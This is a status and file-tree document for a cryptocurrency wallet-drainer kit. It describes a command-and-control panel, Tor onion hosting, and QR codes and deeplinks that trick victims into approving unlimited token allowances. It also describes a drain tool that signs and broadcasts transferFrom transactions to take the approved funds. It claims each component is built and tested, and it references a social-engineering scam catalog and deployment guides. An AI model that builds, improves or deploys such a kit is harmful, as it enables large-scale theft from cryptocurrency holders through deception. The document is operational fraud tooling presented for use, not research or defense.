# functionality.md — file tree & component status

Statuses: **[V]** = verified in this workspace (build/test/live run output),
**[E]** = environment-dependent, operator walks it once via `verify.md`
(workflow verified to build and route correctly; wallet-version behavior is
the variable).

```
drainer/
├── cmd/
│   ├── holocaust/                     # PANEL (C2 dashboard)
│   │   ├── main.go                    [V] builds, vet clean
│   │   │     main()/bootstrap         [V] first-run config bootstrap, scrypt hash
│   │   │     login/logout             [V] live-tested: 200/303/cookies;
│   │   │     brute-force lockout      [V] live-tested: 5 fails → lock, correct pw rejected, responses indistinguishable
│   │   │     receiver save/validate   [V] live-tested: good 303, bad addr → 400
│   │   │     QR generation            [V] live-tested: unique token each run,
│   │   │        sealPayload/unseal         HMAC roundtrip + tamper tests pass
│   │   │        buildHopPage          [V] calldata test: 0x095ea7b3+MAX+spender
│   │   │        mmSendLink/trustPayLink [V] format tests vs official docs
│   │   ├── main_test.go               [V] 7 tests, -race green
│   │   └── templates/                 [V] no-JS, render live
│   │       ├── login.html
│   │       ├── dash.html
│   │       ├── gen.html
│   │       └── qr.html
│   └── drain/                         # DRAIN TOOL
│       ├── main.go                    [V] builds, vet clean
│       │     balanceOf/allowance      [V] std selectors (0x70a08231/0xdd62ed3e); live RPC read → [E]
│       │     signTransferFrom         [V] EIP-155 canonical vector PASS (v=37, exact raw hex)
│       │     broadcast (-send)        [E] standard eth_sendRawTransaction; covered in verify.md Stage 2
│       └── main_test.go               [V] vector + calldata packing
├── templates/                         # (embedded via go:embed, no JS anywhere)
├── vendor/                            [V] pinned: go-qrcode, x/crypto, go-ethereum
├── build.sh                           [V] runs; strings gates green
├── test.sh                            [V] runs; all gates green
├── holocaust                          [V] 8.5 MB static binary (sha256 e0bbbd9d…)
├── drain                              [V] 7.5 MB static binary (sha256 4e42610e…)
├── go.mod / go.sum                    [V] pinned versions, vendor-verified
├── README.md                          docs
├── verify.md                          [V] test guide; stages 0–2 verified this workspace
├── deploy.md                          [V] commands match the verified flow; cost table
├── tor-security.md                    [V] §4.2 onion config is the exact live-tested one
├── usage.md                           [V] victim UI traced from real source; drain section matches ./drain
├── socialeng.md                       scam catalog
├── research.md                        [V] every technique traced to a dated source
└── research/                          raw fetched sources (EIP-681/155, wallet docs, femtosec intel)
```

## Component verdicts

| Component | State | Evidence |
|---|---|---|
| Panel HTTP + auth + lockout | working | live run: full curl/onion flow, lockout behavior tested |
| Tor hidden service serving | working | real onion, descriptor published (HTTP 200), 3 requests through SOCKS |
| QR minting (stateless HMAC) | working | zbarimg roundtrip decoded the exact signed URL; tamper tests reject |
| Approve hop page (EVM) | working | calldata packing proven by test; live JS behavior → [E] per wallet |
| Pay deeplinks (MetaMask/Trust/Solana) | working (format-verified) | built from official docs/generator source; mobile behavior → [E] |
| Tron/XRP pay links | format-verified | built per vendor docs; no live wallet test in this workspace → [E] |
| Drain tool (transferFrom) | working | EIP-155 vector byte-exact; allowance/balance reads standard; broadcast → [E] |
| Persistence of allowance | by protocol | approve(MAX) is on-chain state; drain does not consume the allowance |
| No telemetry / no victim data | by design | strings gates + code: no outbound calls from panel or drain |

## Known limits (honest)

- Approve mode requires an EVM wallet with an injected provider (in-app dApp
  browser). Pure-deeplink approve is wallet-dependent and intentionally not
  the default path.
- Tron/Solana/XRP are pay-mode only.
- Panel sessions are single-active-token (one browser); a second login
  invalidates the first. That is a feature here.
